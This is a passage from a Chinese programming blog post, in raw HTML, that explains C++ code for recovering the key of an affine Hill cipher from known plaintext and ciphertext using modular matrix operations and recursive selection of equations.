class=\"number\">0</span>; i &lt; rowsA; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> j = <span class=\"number\">0</span>; j &lt; colsB; j++) &#123;</span><br><span class=\"line\">            C[i][j] = (A[i][j] - B[i][j] + MOD) % MOD;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> C;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"处理输入输出\"><a class=\"anchor\" href=\"#处理输入输出\">#</a> 处理输入输出</h3>\n<p>为了方便观察算法效率，在输出的时候增加输出算法运行时间。同时还希望以文件流进行输入输出方便测试和观察。</p>\n<p>假定在线测评平台使用  <code>-DONLINE_JUDGE</code>  参数，可以在源代码中这样处理：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> ONLINE_JUDGE</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;chrono&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iomanip&gt;</span></span></span><br><span class=\"line\">FILE *output, *input;</span><br><span class=\"line\">chrono::time_point&lt;std::chrono::high_resolution_clock&gt; start_time, end_time;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ......</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">#<span class=\"keyword\">ifndef</span> ONLINE_JUDGE</span></span><br><span class=\"line\">    output = <span class=\"built_in\">freopen</span>(<span class=\"string\">&quot;output&quot;</span>, <span class=\"string\">&quot;w&quot;</span>, stdout);  <span class=\"comment\">// 重定向标准输出流</span></span><br><span class=\"line\">    input = <span class=\"built_in\">freopen</span>(<span class=\"string\">&quot;input&quot;</span>, <span class=\"string\">&quot;r&quot;</span>, stdin);     <span class=\"comment\">// 重定向标准输入流</span></span><br><span class=\"line\">    start_time = chrono::high_resolution_clock::<span class=\"built_in\">now</span>();</span><br><span class=\"line\">    <span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//  代码主体</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">#<span class=\"keyword\">ifndef</span> ONLINE_JUDGE</span></span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(input);</span><br><span class=\"line\">    end_time = chrono::high_resolution_clock::<span class=\"built_in\">now</span>();</span><br><span class=\"line\">    <span class=\"keyword\">auto</span> duration = std::chrono::<span class=\"built_in\">duration_cast</span>&lt;std::chrono::milliseconds&gt;(end_time - start_time);</span><br><span class=\"line\">    cout &lt;&lt; endl &lt;&lt; endl</span><br><span class=\"line\">            &lt;&lt; <span class=\"string\">&quot;time: &quot;</span></span><br><span class=\"line\">            &lt;&lt; fixed &lt;&lt; <span class=\"built_in\">setprecision</span>(<span class=\"number\">3</span>)</span><br><span class=\"line\">            &lt;&lt; duration.<span class=\"built_in\">count</span>() &lt;&lt; <span class=\"string\">&quot; ms&quot;</span>;</span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(output);</span><br><span class=\"line\">    <span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>要求输入为 3 行：</p>\n<ul>\n<li>第一行为数字代表 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span></li>\n<li>第二行为明文</li>\n<li>第三行为密文</li>\n</ul>\n<p>明文密文全部都是大写字母，长度 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>l</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">len</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">n</span></span></span></span> 相同且满足 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>l</mi><mi>e</mi><mi>n</mi><mo>≥</mo><mn>2</mn><msup><mi>m</mi><mn>2</mn></msup></mrow><annotation encoding=\"application/x-tex\">len\\geq 2m^2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83041em;vertical-align:-0.13597em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≥</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord\"><span class=\"mord mathnormal\">m</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span>；</p>\n<p>因此可以先将明文，密文分别存到字符串中，后续再依据算法处理。</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string m_s, s, c;</span><br><span class=\"line\"><span class=\"built_in\">getline</span>(cin, m_s);</span><br><span class=\"line\"><span class=\"built_in\">getline</span>(cin, c);</span><br><span class=\"line\"><span class=\"built_in\">getline</span>(cin, s);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> len = s.<span class=\"built_in\">size</span>();</span><br><span class=\"line\"><span class=\"type\">int</span> m = <span class=\"built_in\">stoi</span>(m_s);</span><br></pre></td></tr></table></figure></p>\n<p>打印矩阵，从而输出密钥 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>L</mi></mrow><annotation encoding=\"application/x-tex\">L</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">L</span></span></span></span>：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">printMatrix</span><span class=\"params\">(<span class=\"type\">const</span> vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt;&amp; A)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> m = A[<span class=\"number\">0</span>].<span class=\"built_in\">size</span>();</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">const</span> <span class=\"keyword\">auto</span>&amp; row : A) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; m - <span class=\"number\">1</span>; ++i) &#123;</span><br><span class=\"line\">            cout &lt;&lt; row[i] &lt;&lt; <span class=\"string\">&quot; &quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        cout &lt;&lt; row[m - <span class=\"number\">1</span>] &lt;&lt; endl;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>输出 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>b</mi><mo>⃗</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\vec b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.9774399999999999em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9774399999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">b</span></span><span style=\"top:-3.26344em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.2355em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span></span></span></span> 需要单独输出一个向量。假定已经通过 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>B</mi><mo>=</mo><mi>Y</mi><mn>1</mn><mo>−</mo><mi>X</mi><mn>1</mn><mo>⋅</mo><mi>L</mi></mrow><annotation encoding=\"application/x-tex\">B = Y1-X1\\cdot L</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.76666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">L</span></span></span></span> 得到了矩阵 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>B</mi></mrow><annotation encoding=\"application/x-tex\">B</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B</span></span></span></span>：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; m - <span class=\"number\">1</span>; ++i) &#123;</span><br><span class=\"line\">    cout &lt;&lt; B[<span class=\"number\">0</span>][i] &lt;&lt; <span class=\"string\">&quot; &quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">cout &lt;&lt; B[<span class=\"number\">0</span>][m - <span class=\"number\">1</span>];</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"思路一-2\"><a class=\"anchor\" href=\"#思路一-2\">#</a> 思路一</h2>\n<h3 id=\"存储向量和矩阵\"><a class=\"anchor\" href=\"#存储向量和矩阵\">#</a> 存储向量和矩阵</h3>\n<p>定义全局变量：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; x;</span><br><span class=\"line\">vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; y;</span><br><span class=\"line\">vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; X;</span><br><span class=\"line\">vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; Y;</span><br><span class=\"line\">vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; X1;</span><br><span class=\"line\">vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; Y1;</span><br><span class=\"line\">vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; X2;</span><br><span class=\"line\">vector&lt;vector&lt;<span class=\"type\">int</span>&gt;&gt; Y2;</span><br><span class=\"line\"><span class=\"type\">int</span> m = <span class=\"number\">0</span>, n=<span class=\"number\">0</span>, det_inv = <span class=\"number\">0</span>;</span><br></pre></td></tr></table></figure></p>\n<p>存储的形式是全局变量，这样递归的时候更方便。</p>\n<p>这里  <code>x</code>  和  <code>y</code>  分别存储了 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 个向量，每一对向量分别代表一个 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>x</mi><mo>⃗</mo></mover><mo>⋅</mo><mi>L</mi><mo>+</mo><mover accent=\"true\"><mi>b</mi><mo>⃗</mo></mover><mo>=</mo><mover accent=\"true\"><mi>y</mi><mo>⃗</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\vec x\\cdot L + \\vec b=\\vec y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.714em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.714em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">x</span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.20772em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.76666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">L</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.9774399999999999em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9774399999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">b</span></span><span style=\"top:-3.26344em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.2355em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.9084399999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord accent\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.714em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.17994em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.19444em;\"><span></span></span></span></span></span></span></span></span> 中的向量。这是为了排列组合的时候方便选取指定的方程。</p>\n<p>这里  <code>m</code> ,  <code>n</code> ,  <code>det_inv</code>  也是全局变量，也是为了方便递归。</p>\n<p>另外几个矩阵的关系是：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>Y</mi><mo>=</mo><mi>Y</mi><mn>1</mn><mo>−</mo><mi>Y</mi><mn>2</mn><mspace linebreak=\"newline\"></mspace><mi>X</mi><mo>=</mo><mi>X</mi><mn>1</mn><mo>−</mo><mi>X</mi><mn>2</mn></mrow><annotation encoding=\"application/x-tex\">Y=Y1-Y2\\\\\nX=X1-X2\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.76666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mord\">2</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.76666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">2</span></span></span></span></span></p>\n<p>通过如下方式从明文和密文中提取 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 对向量：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>; i &lt; len; i+=m)&#123;</span><br><span class=\"line\">    x.<span class=\"built_in\">push_back</span>(<span class=\"built_in\">vector</span>&lt;<span class=\"type\">int</span>&gt;());</span><br><span class=\"line\">    y.<span class=\"built_in\">push_back</span>(<span class=\"built_in\">vector</span>&lt;<span class=\"type\">int</span>&gt;());</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> j=<span class=\"number\">0</span>; j&lt;m; ++j)&#123;</span><br><span class=\"line\">        x[i / m].<span class=\"built_in\">push_back</span>(c[i + j] - <span class=\"string\">&#x27;A&#x27;</span>);</span><br><span class=\"line\">        y[i / m].<span class=\"built_in\">push_back</span>(s[i + j] - <span class=\"string\">&#x27;A&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">n = x.<span class=\"built_in\">size</span>();</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"递归\"><a class=\"anchor\" href=\"#递归\">#</a> 递归</h3>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 个 里面选 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span> 对向量组合作为  <code>X1</code>  和  <code>Y1</code> ，定义返回值：</p>\n<ul>\n<li><code>0</code>  表示找到了可逆的 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mi>X</mi><mn>1</mn><mo>−</mo><mi>X</mi><mn>2</mn><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(X1-X2)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">2</span><span class=\"mclose\">)</span></span></span></span>，递归结束。</li>\n<li><code>1</code>  表示还没有找到</li>\n</ul>\n<p>后面的函数返回值都是与此相同的定义。</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">combi</span><span class=\"params\">(<span class=\"type\">int</span> n, <span class=\"type\">int</span> m, <span class=\"type\">int</span> start, vector&lt;<span class=\"type\">int</span>&gt;&amp; combination)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (combination.<span class=\"built_in\">size</span>() == (<span class=\"type\">long</span> <span class=\"type\">unsigned</span> <span class=\"type\">int</span>)m) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">after_combi</span>(combination);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span 